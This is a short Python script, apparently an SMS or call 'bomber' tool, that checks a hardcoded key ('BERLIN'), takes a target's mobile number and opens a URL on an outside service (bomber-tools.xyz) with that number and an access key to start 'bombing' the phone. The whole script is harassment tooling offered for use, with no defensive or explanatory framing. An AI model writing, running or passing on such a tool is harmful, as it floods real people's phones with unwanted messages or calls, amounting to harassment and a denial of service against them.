import webbrowser
from termcolor import colored

def open_url_in_background(url):
    webbrowser.open_new(url)

def main():
    name = input("Enter your name: ")
    key = input("Enter the key: ")
    mobile_number = input("Enter your mobile number: ")

    if key != "BERLIN":
        print(colored("Invalid key! Bombing cannot be initiated.", "red"))
        return

    # Assuming the URL structure remains the same
    url = f"https://bomber-tools.xyz/?mobile={mobile_number}&accesskey=bombersmm&submit=Submit"
    open_url_in_background(url)

    print(colored("Bombing started by BERLIN", "yellow"))

if __name__ == "__main__":
    main()
